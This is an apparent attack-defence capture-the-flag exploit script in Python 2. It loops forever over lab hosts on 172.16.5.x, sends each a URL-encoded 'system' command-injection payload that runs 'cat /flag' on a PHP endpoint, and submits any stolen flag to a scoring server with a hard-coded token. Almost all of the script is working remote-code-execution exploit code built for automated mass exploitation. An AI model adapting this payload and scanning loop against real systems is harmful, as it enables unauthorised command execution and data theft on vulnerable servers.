# !/usr/bin/env python
#  -*- coding: utf-8 -*-
import requests


def poc(id):
    try:
        id = int(id)
        if id == 28:
            return False
        url = 'http://172.16.5.{}:5007'.format(id + 9) + '/index.php/666/?A=system&BB=%63%61%74%20%2f%66%6c%61%67'
        r = requests.get(url, timeout=5)
        flag = r.content.split('<!DOCTYPE html>')[0]
        if len(flag):
            [postflag(flag) for i in range(3)]
    except Exception, e:
        return False


def postflag(ans, token='bc5b6ad6c9f08fb9600ef7a702e6bf1d'):
    ans = ans.strip()
    if len(ans) == len('bba9a3ad-08c8-4e1b-a6cd-ac2a3cabc143'):
        r = requests.post(url='http://172.16.4.1/Common/submitAnswer', data={'token': token, 'answer': ans})
        print(r.content)


if __name__ == '__main__':
    while 1:
        for i in range(51):
            poc(str(i))
